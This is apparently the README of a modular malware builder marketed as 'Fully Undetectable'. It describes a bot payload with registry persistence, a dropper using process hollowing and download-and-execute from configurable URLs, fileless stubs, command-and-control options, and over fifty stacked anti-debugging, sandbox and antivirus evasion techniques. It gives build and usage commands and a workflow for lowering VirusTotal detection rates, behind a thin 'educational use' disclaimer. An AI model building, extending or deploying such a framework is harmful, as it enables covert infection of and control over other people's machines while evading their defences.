# FUD Modular System - Ultimate Anti-Detection Framework

## Overview
A comprehensive, modular FUD (Fully Undetectable) system designed for extreme anti-detection testing and payload delivery. Built with MinGW for cross-platform compilation from Linux to Windows targets.

## Architecture

### Core Components

1. **Core MASM Bot** (`core_masm_bot/`)
   - Stable, unchanging assembly payload written in C for MinGW compatibility
   - Basic stealth, persistence, and payload execution
   - Injection points for PE builder integration

2. **PE Builder** (`pe_builder/`)
   - Advanced PE file manipulation and encryption
   - Multi-layer encryption (XOR, AES, ChaCha20, RC4, Custom)
   - Aggressive anti-debugging and sandbox detection
   - Process hollowing and code cave injection
   - Download/execute functionality for 6 URLs

3. **Stub Generator** (`stub_generator/`)
   - Fileless deployment system
   - Embedded file carrying (6 files: calculator + 5 text files)
   - GitHub repository scraping for dynamic URLs
   - Memory-based execution without disk writes

4. **Orchestrator** (`orchestrator/`)
   - Central GUI application for system management
   - 50+ evasion technique selection
   - Randomize feature for automatic technique stacking
   - Build automation and deployment control

5. **Quantum Module** (`quantum_module/`)
   - Placeholder for recovered MASM production code
   - Integration points for advanced quantum techniques
   - Replace with your quantum recovered MASM code

## Features

### Anti-Detection Techniques (50+ Implemented)

#### Anti-Debugging
- IsDebuggerPresent checks
- PEB BeingDebugged flag detection
- CheckRemoteDebuggerPresent
- Timing-based debugger detection
- Hardware breakpoint detection
- Context register analysis

#### Sandbox/VM Evasion
- System uptime analysis
- Mouse movement detection
- Memory size verification
- CPU count checking
- Username analysis
- Registry artifact detection
- VMware/VirtualBox/Hyper-V detection

#### PE Manipulation
- Timestamp randomization
- Characteristics modification
- Entry point alteration
- Fake section injection
- Entropy manipulation
- Certificate spoofing
- Code cave utilization

#### Encryption Layers
- XOR encryption
- AES simulation
- ChaCha20 simulation
- RC4 simulation
- Custom encryption algorithms
- Multi-layer stacking

#### Process Injection
- Process hollowing
- DLL injection simulation
- Thread hijacking
- Process doppelganging
- Atom bombing simulation
- Heaven's Gate technique

#### Advanced Evasion
- API obfuscation via hashing
- String encryption
- Control flow obfuscation
- Junk code insertion
- Memory layout randomization
- Exception handling obfuscation

### Fileless Capabilities
- Memory-based execution
- Embedded file deployment
- URL-based downloads
- GitHub repository scraping
- No disk writes required

### Command & Control
- Download/Execute URLs (6 configurable)
- Upload/Execute for targeting deployments
- Timed deployment options
- Deploy on restart persistence
- BotKiller with severity levels

## Building

### Prerequisites
```bash
# Install MinGW for cross-compilation
sudo apt update && sudo apt install -y mingw-w64 g++-mingw-w64 gcc-mingw-w64 wine
```

### Compilation
```bash
# Build entire system
make all

# Build individual components
make core      # Core MASM Bot
make pe        # PE Builder
make stub      # Stub Generator
make orchestrator  # Orchestrator GUI
make quantum   # Quantum Module
```

### Output
All executables are built in `build/bin/`:
- `core_payload.exe` - Core MASM Bot
- `pe_dropper.exe` - PE Builder
- `fileless_stub.exe` - Stub Generator
- `fud_builder.exe` - Orchestrator GUI
- `quantum_payload.exe` - Quantum Module

## Usage

### Core MASM Bot
```bash
# Basic execution
./build/bin/core_payload.exe

# Features:
# - Executes calc.exe in stealth mode
# - Installs registry persistence
# - Hides console window
```

### PE Builder
```bash
# Test mode
./build/bin/pe_dropper.exe --test

# Process a PE file
./build/bin/pe_dropper.exe --target target.exe --payload core_payload.exe

# Download and execute test
./build/bin/pe_dropper.exe --download-test
```

### Stub Generator
```bash
# Test mode
./build/bin/fileless_stub.exe --test

# Deploy with embedded files
./build/bin/fileless_stub.exe --deploy --files 6

# GitHub scraping
./build/bin/fileless_stub.exe --github https://github.com/user/repo
```

### Orchestrator
```bash
# GUI mode
./build/bin/fud_builder.exe

# Command line mode
./build/bin/fud_builder.exe --cli --randomize --techniques 25
```

## Configuration

### Technique Selection
The Orchestrator provides checkboxes for 50+ evasion techniques:
- Anti-debugging (8 techniques)
- Sandbox evasion (12 techniques)
- VM detection (6 techniques)
- PE manipulation (10 techniques)
- Encryption layers (5 techniques)
- Process injection (6 techniques)
- Advanced evasion (8 techniques)

### Randomize Feature
Automatically selects random combinations of techniques:
```bash
# Select 25 random techniques
./build/bin/fud_builder.exe --randomize --count 25

# Select techniques by category
./build/bin/fud_builder.exe --randomize --category anti-debug
```

### Quantities Configuration
- Download/Execute URLs: 0-100
- Upload/Execute targets: 0-50
- Embedded files: 0-20
- GitHub repos to scrape: 0-10
- PE files to process: 0-25
- MASM payloads: 0-15
- Decoy operations: 0-30

## Integration

### Adding Your Quantum Code
1. Replace `quantum_module/quantum_payload.c` with your recovered MASM production code
2. Ensure compatibility with the integration markers:
   - `QUANTUM_START_MARKER_QUANTUM`
   - `QUANTUM_END_MARKER_QUANTUM`
3. Rebuild: `make quantum`

### Custom Techniques
Add new evasion techniques to the appropriate component:
- Anti-analysis: `pe_builder/pe_dropper.cpp`
- Fileless execution: `stub_generator/fileless_stub.cpp`
- GUI controls: `orchestrator/build_manager.cpp`

## Testing

### Local Testing
```bash
# Test all components
make test

# Individual component tests
cd build/bin && wine ./core_payload.exe
cd build/bin && wine ./pe_dropper.exe --test
cd build/bin && wine ./fileless_stub.exe --test
```

### VirusTotal Testing
1. Build payload with selected techniques
2. Upload to VirusTotal
3. Monitor detection rates
4. Adjust technique combinations

## Security Notes

⚠️ **WARNING**: This system is designed for:
- Anti-virus testing and research
- Security tool development
- Educational purposes
- Authorized penetration testing

**DO NOT USE** for:
- Unauthorized system access
- Malicious purposes
- Illegal activities

## Development

### Adding New Techniques
1. Implement technique in appropriate component
2. Add checkbox to Orchestrator GUI
3. Update technique list in `initializeTechniques()`
4. Add to randomize function
5. Test with `make test`

### MinGW Compatibility
All code is designed for MinGW cross-compilation:
- Uses MinGW-compatible intrinsics
- Avoids MSVC-specific features
- Compatible with Linux → Windows builds

## License
This project is for educational and research purposes only. Use responsibly and in accordance with applicable laws.

## Support
For issues, feature requests, or contributions:
1. Check the build logs for MinGW compatibility issues
2. Ensure all dependencies are installed
3. Test individual components before full system build
4. Replace quantum module with your recovered MASM code